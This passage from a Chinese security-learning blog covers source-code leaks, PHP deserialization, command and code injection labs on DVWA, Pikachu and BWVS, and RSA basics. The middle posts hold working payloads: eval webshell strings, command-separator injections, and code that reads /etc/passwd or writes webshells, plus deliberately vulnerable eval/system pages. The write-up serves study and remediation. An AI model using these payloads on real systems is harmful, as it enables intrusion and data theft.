1、漏洞成因 服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。 编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。 该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。 2、漏洞利用 在 URL 加上域名+网站备份文件名 +压缩包后缀 也就是 URL，下载网站源码。部分常见的网站备份文件后缀名： .rar .zip .7z .tar.gz .bak .swp .txt部分常见的备份文件名： www back backup web temp data website 新建文件夹3、修复建议 把备份文件删除或移出web根目录 0x08 WEB-INF/web.xml 泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 1、漏洞成因 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 2、漏洞利用 通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来 3、修复建议 修改Nginx配置文件禁止访问WEB-INF目录 location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！ 参考博客：谈谈源码泄露 · WEB 安全常见Web源码泄露总结","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"信息泄露","slug":"漏洞原理/信息泄露","permalink":"https://qwzf.github.io/categories/漏洞原理/信息泄露/"}],"tags":[{"name":"源码泄露","slug":"源码泄露","permalink":"https://qwzf.github.io/tags/源码泄露/"},{"name":"源码泄露类型","slug":"源码泄露类型","permalink":"https://qwzf.github.io/tags/源码泄露类型/"}],"author":"qwzf"},{"title":"PHP反序列化漏洞","slug":"PHP反序列化漏洞","date":"2019-08-14T15:29:51.682Z","updated":"2020-08-01T16:43:33.434Z","comments":true,"path":"2019/08/14/PHP反序列化漏洞/","link":"","permalink":"https://qwzf.github.io/2019/08/14/PHP反序列化漏洞/","excerpt":"","text":"前言最近又学习了新的漏洞知识——PHP反序列化漏洞，学习之余总结一下。 什么是php反序列化漏洞漏洞简介php反序列化漏洞，又叫php对象注入漏洞。简单来讲，就是在php反序列化的时候，反序列化的内容是用户可控，那么恶意用户就可以构造特定序列化内容的代码，通过unserialize()函数进行特定的反序列化操作，并且程序的某处存在一些敏感操作是写在类中的，那么就可以通过这段恶意代码，达到执行攻击者想要的操作。 漏洞形成原因漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。 但还是先了解一下php类与对象、php序列化和反序列化和魔术方法的相关知识。 php类与对象类的声明 [修饰类的关键字] class 类名 { 成员属性 成员方法 } （1）成员属性，在类中声明的变量，称为成员属性。声明时，变量前面必须使用一个关键字，如使用public、private、static等关键字修饰，如不需要有特殊意义的修饰，则可使用var关键字（2）成员方法，在类中声明的函数，称为成员方法。 通过类实例化对象类创建后，可以使用 new 运算符来实例化该类的对象。 $变量名 = new 类名称; 对象引用$this成员方法属于哪个对象，$this引用就代表哪个对象。例： &lt;?php class Person { public $name; function say(){ echo &#39;我的名字是&#39;.$this-&gt;name; } } $xm = new Person; //实例化对象 $xm-&gt;name = &#39;小明&#39;; //对象属性的赋值 $xm-&gt;say(); //访问对象的成员方法 ?&gt; 构造方法构造方法的作用是为成员属性初始化；构造方法是在对象创建完后，第一个自动调用的方法；构造方法，方法名固定，在PHP4中构造方法名与类名一致；PHP5中是 __construct()析构方法当对象被释放之前最后一个自动调用的方法。作用：关闭一些资源，做一个清理工作。名称：__destruct()例： &lt;?php class Person { public $name; function __construct($name=&#39;&#39;){ echo &quot;构造函数被调用&quot;.&quot;&lt;br&gt;&quot;; $this-&gt;name = $name; } function say(){ echo $this-&gt;name; } function __destruct(){ echo &quot;&lt;br&gt;&quot;.&quot;析构函数被调用&quot;; } } $car = new Person(); //当创建一个对象的时候，类中的构造函数就会被调用 $car-&gt;name = &#39;小明 &#39;; //对象属性的赋值 $car-&gt;say(); //访问对象的成员方法 unset($car); //unset可以销毁对象，当销毁对象的时候就会调用类中的析构函数 ?&gt; php序列化与反序列化序列化：serialize 把一个对象转成字符串形式， 可以用于保存。函数 : serialize()把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。测试代码： &lt;?php class chybeta{ var $test = &#39;123&#39;; } $class1 = new chybeta; $class1_ser = serialize($class1); print_r($class1_ser); ?&gt; 将其序列化后的结果： O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a 7表示对象的名称有7个字符 &quot;chybeta&quot;表示对象的名称 1表示有一个值 {s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，s表示字符串，4表示该字符串的长度，”test”为字符串的名称，之后的类似 php允许保存一个对象方便以后重用，这个过程被称为序列化。反序列化:unserialize 把serialize序列化后的字符串变成一个对象。函数: unserialize()可以从已存储的表示中创建PHP的值。恢复原先被序列化的变量。测试代码： &lt;?php class chybeta{ var $test = &#39;123&#39;; } $class2 = &#39;O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}&#39;; print_r($class2); echo &quot;&lt;/br&gt;反序列化结果为：&lt;/br&gt;&quot;; $class2_unser = unserialize($class2); print_r($class2_unser); ?&gt; 将其反序列化后的结果： 魔术方法magic 函数php面向对象变成中，有一类函数叫做magic function，魔术函数。这些函数是以(双下划线)开头的，他们是一些当依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，这里有一些比较常见的例如construct，destory，sleep，wakeup，__toString函数。 __construct()：创建一个对象时会被调用。 __destruct()：销毁一个对象时会被调用。 __wakeup()：触发unserialize()方法时会被调用。 __sleep()：触发serialize()方法时会被调用。 __toString()：类对象被当作一个字符串使用时会被调用。 __get()：调出不可访问（private，protect等修饰）属性时会被调用。 __set()：修改或写入不可访问（private，protect等修饰）属性时会被调用。 __isset()：对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。 __unset()：对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。 __invoke()：将实例化对象当作方法使用时会被调用。 php反序列化漏洞1、wakeup()或destruct()的利用基本思路本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “”,再调用unserialize()时会通过wakeup()把test的写入到webshell.php中。利用unserialize()后会导致wakeup() 或__destruct()的直接调用，中间无需其他过程。所以在本地搭建环境，index1源码为： &lt;?php class chybeta{ var $test = &#39;123&#39;; function __wakeup(){ $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ; fwrite($fp,$this-&gt;test); fclose($fp); } } $class3 = $_GET[&#39;test&#39;]; print_r($class3); echo &quot;&lt;/br&gt;&quot;; $class3_unser = unserialize($class3); require &quot;webshell.php&quot;; // 为显示效果，把这个shell.php包含进来 ?&gt; 编写exp之后用serialize函数进行序列化 &lt;?php class chybeta{ var $test = &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;; } $class1 = new chybeta; $class1_ser = serialize($class1); print_r($class1_ser); ?&gt; 得到payload O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:25:&quot;&lt;?php @eval($_POST[a]);?&gt;&quot;;} 测试一下，测试成功并且将一句话木马写入到了webshelll.php文件 2、其他Magic函数的利用基本思路向test传入构造好的序列化字符串后，进行反序列化时自动调用 wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的construct()方法，从而把写入到 webshell.php中。利用有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象。在本地搭建环境(删除之前webshell.php里的内容)，index2源码为： &lt;?php class ph0en1x{ function __construct($test){ $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;); fwrite($fp,$test); fclose($fp); } } class chybeta{ var $test = &#39;123&#39;; function __wakeup(){ $obj = new ph0en1x($this-&gt;test); } } $class5 = $_GET[&#39;test&#39;]; print_r($class5); echo &quot;&lt;/br&gt;&quot;; $class5_unser = unserialize($class5); require &quot;webshell.php&quot;; ?&gt; 编写exp之后，用serialize函数进行序列化，得到payload O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:25:&quot;&lt;?php @eval($_POST[a]);?&gt;&quot;;} 并将一句话木马写入到了webshelll.php文件 3、普通成员的利用基本思路new一个新的chybeta对象后，调用construct()，其中又new了ph0en1x对象。在结束后会调用destruct()，其中会调用action()，从而输出 ph0en1x。利用前面的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能通过“自动调用”来达到目的。这时，要寻找相同的函数名，把敏感函数和类联系在一起。 &lt;?php class chybeta { var $test; function __construct() { $this-&gt;test = new ph0en1x(); } function __destruct() { $this-&gt;test-&gt;action(); } } class ph0en1x { function action() { echo &quot;ph0en1x&quot;; } } class ph0en2x { var $test2; function action() { eval($this-&gt;test2); } } $class6 = new chybeta(); unserialize($_GET[&#39;test&#39;]); ?&gt; 构造序列化 &lt;?php class chybeta { var $test; function __construct() { $this-&gt;test = new ph0en2x(); } } class ph0en2x { var $test2 = &#39;@eval($_POST[a]);&#39;; } echo serialize(new chybeta()); ?&gt; 得到payload： O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:{s:5:&quot;test2&quot;;s:17:&quot;@eval($_POST[a]);&quot;;}} 传给index.php的test参数蚁剑测试一下，测试成功参考博客：浅谈php反序列化漏洞PHP反序列化漏洞与防御 php反序列化漏洞靶场实战靶场环境皮卡丘：https://github.com/zhuifengshaonianhanlu/pikachu 开始实验先输入个1，抓包查看发现传参方式为post型，且参数变量为o其他没有有用信息。emmm。。查看源码吧！发现有用信息了。先编写exp之后，然后用serialize函数进行序列化。因为是post传参，所以就不演示一句话了，并且根据源码phpinfo();也不行。直接xss弹框试一下 &lt;?php class S{ var $test = &#39;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#39;; } $class1 = new S; $class1_ser = serialize($class1); print_r($class1_ser); ?&gt;得到payload O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;} 成功 感悟了解了php类与对象、反序列化和序列化和反序列化漏洞的成因。同时也学会了php反序列化漏洞的三种利用方式。继续学习，小白进阶ing。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"反序列化漏洞","slug":"漏洞原理/反序列化漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/反序列化漏洞/"}],"tags":[{"name":"PHP类与对象","slug":"PHP类与对象","permalink":"https://qwzf.github.io/tags/PHP类与对象/"},{"name":"序列化与反序列化基础","slug":"序列化与反序列化基础","permalink":"https://qwzf.github.io/tags/序列化与反序列化基础/"},{"name":"魔术方法简单利用","slug":"魔术方法简单利用","permalink":"https://qwzf.github.io/tags/魔术方法简单利用/"}],"author":"qwzf"},{"title":"命令执行(Command Injection)与代码执行(Code execution)","slug":"命令执行(Command Injection)与代码执行(Code execution)","date":"2019-08-08T15:11:51.661Z","updated":"2020-08-01T16:40:51.268Z","comments":true,"path":"2019/08/08/命令执行(Command Injection)与代码执行(Code execution)/","link":"","permalink":"https://qwzf.github.io/2019/08/08/命令执行(Command Injection)与代码执行(Code execution)/","excerpt":"","text":"前言Web学习进行时，最近又学习了命令执行和代码执行漏洞。于是记录了学习过程。 命令执行与代码执行基础简介命令执行漏洞命令执行漏洞概念：命令执行漏洞，就是指用户通过浏览器或其他辅助程序提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。 通俗的讲：当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以住人恶意系统命令到正常的命令中，造成命令执行攻击。命令执行漏洞成因：当我们开发的应用需要一些除去web的特殊功能时，就需要调用一些外部程序。命令执行漏洞：直接调用操作系统命令命令执行漏洞原理：在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。命令执行相关函数本质：命令执行产生函数：exec，shell_exec，system，passthru等将参数以dos、shell执行 exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec() 、反引号` 实际上是使用shell_exec()函数，此外还要小心mail()函数的安全。 system() 输出并返回最后一行shell结果。 exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。 passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。 popen()、proc_open() 不会直接返回执行结果，而是返回一个文件指针 命令执行分隔符： windows： &amp;&amp; || &amp; | linux： &amp;&amp; || &amp; | ;windows：| 直接执行后面的语句 ping 127.0.0.1|whoami|| 前面出错执行后面的 ，前面为假 ping 2 || whoami&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoamiLinux：; 前面的执行完执行后面的 ping 127.0.0.1;whoami| 管道符，显示后面的执行结果 ping 127.0.0.1|whoami|| 当前面的执行出错时执行后面的 ping 1||whoami&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami命令执行漏洞利用：1、可尝试进行反弹shell，搭建服务执行wget下载webshell。2、写入webshell:利用命令注入写一句话php webshell到web目录涉及到一些特殊字符的转义假设需要写入&lt;?php eval($_POST[kang]); ?&gt;，方法如下：Windows：用^转义&lt;，即执行echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; webweb可写目录加文件完整名字Linux：linux下需要用\\来转义&lt;，不过很多php都默认开启gpc(魔术引号magic_quotes_gpc()）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; webweb可写目录加文件完整名字 后面命令注入也有时间盲注和sql注入很像命令执行漏洞修复建议： 尽量不使用命令执行函数 提交的变量在进入执行命令函数前进行过滤和检测(如：调用addslashes进行转义) 使用动态函数之前，确保使用的函数是指定的函数之一 对于PHP语言，不能完全控制的危险函数(如：disable_functions)最好不使用 PHP内置的两个函数可以有效防止命令执行：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。资料参考：http://cn.php.net/manual/zh/function.escapeshellarg.php escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。资料参考：http://cn.php.net/manual/zh/function.escapeshellcmd.php 代码执行漏洞代码执行漏洞成因：应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。大部分都是根据源代码判断代码执行漏洞。代码执行漏洞：靠执行脚本代码调用操作系统命令代码执行漏洞原理：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。代码执行相关函数： PHP: eval、assert、preg_replace()、+/e模式（PHP版本&lt;5.5.0） Javascript: eval Vbscript：Execute、Eval Python: exec Java: Java中没有php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞。 代码执行漏洞的案例： 可控点为待执行的程序。 &lt;?php $data = $_GET[‘data’]; eval (“\\$ret = $data;”); echo $ret; ?&gt; 使用：直接传入我们想要执行的PHP代码。 可控点某函数的参数值且被单引号包裹。 &lt;?php $data = $_GET[‘data’]; eval (“\\$ret = strtolower(‘$data’);”); echo $ret; ?&gt; 使用：必须先闭合单引号。Pl：’);所需函数;// 可控点某函数的参数值且被双引号包裹。 &lt;?php $data = $_GET[‘data’]; eval (“\\$ret = strtolower(“\\’’$_data\\”);”); echo $ret; ?&gt; Pl: {${所需函数}}“);所需函数;//在PHP中，双引号里面如果包含有变量，PHP解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 preg_replace()+/e(PHP版本&lt;5.5.0) &lt;?php $data = $_GET[‘data’]; preg_repalce(‘/&lt;data&gt;(.*)&lt;\\ /data&gt;/e’, ’$ret=”\\\\1”;’ $data); echo $ret; ?&gt; {${所需函数}}/e 修正符/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 代码执行漏洞利用：1.一句话木马 ${@eval($_POST[1])} 2.获取当前工作路径 ${exit(print(getcwd()))} 使用菜刀3.读文件 ${exit(var_dump(file_get_contents($_POST[f])))} f=/etc/passwd 使用post提交数值 f=/etc/passwd4.写webshell ${exit(var_dump(file_put_contents($_POST[f], $_POST[d])))} f=1.php&amp;d=1111111 同样使用post代码执行漏洞修复方案： 对于eval()函数一定要保证用户不能轻易接触eval参数或者用正则严格判断输入的数据格式。 对于字符串一定要使用单引号包裹可控代码，并且插入前进行addslashes 对于preg_replace放弃使用e修饰符.如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹。 基础环境搭建搭建使用Web服务器环境(Apache+PHP+MySQL、我用的phpstudy集成环境)命令执行环境新建一个commnd.php文件，其中输入代码： &lt;?php $a=$_GET[&#39;cmd&#39;]; if ($a){ system(&quot;$a&quot;); } ?&gt; 测试一下报错是因为没有get传参。get传参测试是否成功(如果显示编码有问题，可以设置编码)这种操作相当于在命令行（cmd）下进行ipconfig的查询。代码执行环境新建code.php,输入代码： &lt;?php eval($_REQUEST[&#39;code&#39;]); ?&gt; 在浏览器中打开，传参(get或post都行)，参数值我选择phpinfo();效果和查看phpinfo.php是一样的。 DVWA漏洞靶场-Command Injection(命令执行)1、low 级别127.0.0.1 &amp; ipconfig 没有任何过滤，执行成功stristr(string,search,before_search)stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。php_uname(mode)这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式）”s ”（返回操作系统名称）”n”（返回主机名）”r”（返回版本名称）”v”（返回版本信息） ”m”（返回机器类型）可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。 2、medium 级别查看源码设置了黑名单，对 &amp;&amp; ； 进行了过滤，替换成空单 &amp; 或者 || 可绕过，即： 127.0.0.1 &amp; ipconfig 或 127.0.0.1 || ipconfig 3、high 级别查看源码更加严格过滤，对黑名单中所有字符进行替换，&amp;&amp; 会被替换两次过滤了 | + 空格，使用无空格|绕过，即可执行成功。即： 127.0.0.1|ipconfig 4、impose 级别查看源码stripslashes(string)stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。explode(separator,string,limit)把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。is_numeric(string)检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。 限制IP格式，这就是所谓的白名单，可以有效的防止命令注入。不推荐黑名单，应该可以通过双引号，略过黑名单。linux下还支持单引号 BWVS漏洞靶场-代码执行1、一句话木马http://192.168.204.128/BWVS//bug/code_exec/code.php?code=${@eval($_POST[&#39;a&#39;])}&amp;submit=submit 2、获取当前工作路径http://192.168.204.128/BWVS//bug/code_exec/code.php?code= ${exit(print(getcwd()))}&amp;submit=submit 3、读文件${exit(var_dump(file_get_contents($_POST[f])))} f=/etc/passwd 4、写webshell${exit(var_dump(file_put_contents($_POST[f], $_POST[d])))} f=webshell.php&amp;d=&lt;?php @eval($_POST[&#39;abc&#39;]); ?&gt; 测试是否上传成功，上传成功 参考：DVWA漏洞靶场-命令执行(Command Injection)代码执行漏洞PHP安全之慎用preg_replace的/e修饰符《Web安全攻防》命令执行、代码执行漏洞 感悟通过学习命令执行和代码执行。又收获了好多知识，继续努力！！！小白进阶ing","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"命令注入","slug":"漏洞原理/命令注入","permalink":"https://qwzf.github.io/categories/漏洞原理/命令注入/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"https://qwzf.github.io/tags/命令执行/"},{"name":"代码执行","slug":"代码执行","permalink":"https://qwzf.github.io/tags/代码执行/"}],"author":"qwzf"},{"title":"Crypto-RSA加密","slug":"Crypto-RSA加密","date":"2019-08-06T15:16:34.661Z","updated":"2019-08-12T09:36:57.325Z","comments":true,"path":"2019/08/06/Crypto-RSA加密/","link":"","permalink":"https://qwzf.github.io/2019/08/06/Crypto-RSA加密/","excerpt":"","text":"前言最近学习了RSA加密原理，并且做了些有关RSA的Crypto题。收获很大，总结了一下 一、对称加密和非对称加密对称加密算法 （1）甲方选择某一种加密规则，对信息进行加密； （2）乙方使用同一种规则，对信息进行解密。 最大弱点：甲方必须把加密规则告诉乙方，否则无法解密。保存和传递密钥，就成了最头疼的问题。非对称加密算法 （1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。 （2）甲方获取乙方的公钥，然后用它对信息加密。 （3）乙方得到加密后的信息，用私钥解密。 公钥加密的信息只有私钥解得开，那么只要私钥不泄漏，通信就是安全的 二、RSA基本介绍介绍 RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。 对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。现在只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。 RSA签名验签 使用私钥将明文进行签名生成密文串与明文一起传输。对方收到数据后使用公钥和密文串进行验签。如果验签通过就说明就说明第一数据没有被修改过；第二这些数据一定是持有私钥的人发送的，因为私钥只有自己持有，起到防抵赖的作用。 三、RSA数学知识1、互质关系如果两个正整数，除了1之外没有其他公因子，我们称这两个数是互质关系。不是质数也可以构成互质关系。关于互质关系，有以下结论： 任意两个质数构成互质关系，比如13和61. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10. 如果两个数中，较大的那个数是质数，则两者构成互质关系，比如97和57. 1和任意一个自然数都是互质关系。 p是大于1的整数，则p和p-1构成互质关系，比如57和56. p是大于1的奇数，则p和p-2构成互质关系，比如17和15. 2、欧拉函数任意给定正整数n,计算在小于等于n的正整数之中，有多少个与n构成互质关系。计算这个值的方法叫做欧拉函数。以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。 如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。 如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。 如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)，则比如 φ(8) = φ(2^3) =2^3 - 2^2 = 8 -4 = 4。这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p^(k-1) 个，即1×p、2×p、3×p、…、p^(k-1)×p，把它们去除，剩下的就是与n互质的数。上面的式子还可以写成下面的形式：可以看出，上面的第二种情况是 k=1 时的特例。 如果n可以分解成两个互质的整数之积，n = p1 × p2则φ(n) = φ(p1p2) = φ(p1)φ(p2)即积的欧拉函数等于各个因子的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。 因为任意一个大于1的正整数，都可以写成一系列质数的积。根据第4条的结论，得到再根据第3条的结论，得到也就等于这就是欧拉函数的通用计算公式。比如，1323的欧拉函数，计算过程如下：φ(1323)=φ(3^2 * 7^2)=1323(1-1/3)(1-1/7)=756 3、欧拉定理如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。 如果正整数a与质数p互质，应为φ(p)=p-1，所以欧拉函数可写成：这是著名的费马小定理。它是欧拉定理的特例。欧拉定理是RSA算法的核心。 4、模反元素如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除。比如：3和11互质，那么3的模反元素是4，应为3*4-1 可以被11整除。4加减11的整数倍数都是3的模反元素。欧拉定理可以用来证明模反元素必然存在：a的φ(n)-1次方，就是a的模反元素 四、RSA算法 1、公钥和私钥的生成RSA算法之一种非对称加密算法。具体的加密工程如下：使用A和他的小伙伴B来举例子。假设A想通过一个不可靠的媒体接受B的一条私人消息，他可以用下面的方式产生一个公钥和私钥。 1. 随意选择两个大的质数p和q，p不等于q，计算N = pq. 2. 根据欧拉函数，求得r=φ(N)=φ(p)φ(q)=(p-1)(q-1)。 3. 选择一个小于r的整数e,是e与r互质。并求得e关于r的模反元素，命名为d。(求d令ed≡1(mod r))。(模反元素存在，当且仅当e与r互质） 4. 将p和q的记录销毁。其中(N，e)是公钥，(N，d)是私钥。 例子： A随机选两个不相等的质数61和53，并计算两数的积N=61*53=3233，N的长度就是密钥长度。3233的二进制是110010100001，一共12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，总要的场合是2048位。 计算N的欧拉函数。 φ(N)=(p-1)(q-1)=60*52=3120. A 在1到3120上随机选择了一个随机数e=17。 计算e对φ(N)的模反元素d，ed ≡ 1 (mod φ(N))等价于ed-1=kφ(N)。找到模反元素d，实质上就是对这个二元一次方程求解：17x+3120y=1。用扩展欧几里得算法求解。可以算出一组解(x,y)=(2753,-15)，即d=2753。 其中N=3233,e=17,d=2753。所以公钥就是(N,e)=(3233,17)，私钥(N,d)=(3233,2753)。实际应用中公钥和私钥都是采用ASN.1格式表达的。 2、可靠性密钥生成步骤，一共出现六个数字：p、q、N、φ(N)、e、d一旦d泄露，就等于私钥泄露。 ed ≡ 1(mod φ(N))。只有知道e和φ(N)，才能算出d φ(N)=(p-1)(q-1)。只有知道p和q,才能算出φ(N） N=pq,只有将n分解才能算出p和q只有将n质因数分解，才能算出d。也就意味着私钥破译。但大整数的质因数分解是非常困难的。 3、加密和解密加密加密要用到公钥(N,e)。假设B要向A发送加密信息m，B就要用A的公钥(N,e)对m进行加密。但m必须是整数(字符串可以取ascii值或unicode值)，且m必须小于n。加密就是计算下式的c。 m^e ≡ c (mod n)假设m=65,A的公钥(3233,17),所以等式如下： 65^17≡2790（mod 3233）所以c等于2790，B就把2790发给A。 解密A收到B发来的c(也就是2790)后，就用自己的私钥(3233,2753)进行解密。 c^d ≡ m (mod n)也就是c的d次方除以n的余数就是m。2790^2753 ≡ 65 (mod 3233)因此得到原文65。 证明证明为什么用私钥就能解密。就是要证明这个式子： c^d ≡ m (mod n)因为加密规则是： ｍ^e ≡ c (mod n)于是，c可以写成： c = m^e - kn将c代入要我们要证明的那个解密规则： (m^e - kn)^d ≡ m (mod n)等同于求证： m^ed ≡ m (mod n) 因为:ed ≡ 1 (mod φ(n)) 所以:ed = hφ(n)+1 将ed代入: m^(hφ(n)+1) ≡ m (mod n)接下来，分成两种情况证明上面这个式子。 当m与n互质根据欧拉定理，此时 m^φ(n) ≡ 1 (mod n) 得到:(m^φ(n))^h × m ≡ m (mod n) 由此原始得到证明。 当m与n不是互质时 此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立： (kp)^q-1 ≡ 1 (mod q) 进一步得到： [(kp)^(q-1)]^(h(p-1))× kp ≡ kp (mod q) 即：(kp)^ed ≡ kp (mod q) 改写成：(kp)^ed = tq + kp 上式t必然能被p整除，即t=t&#39;p (kp)^ed = t&#39;pq + kp 因为m=kp,n=pq,所以： m^ed ≡ m (mod n)证明完毕。 参考博客：RSA算法原理(一)RSA算法原理(二) 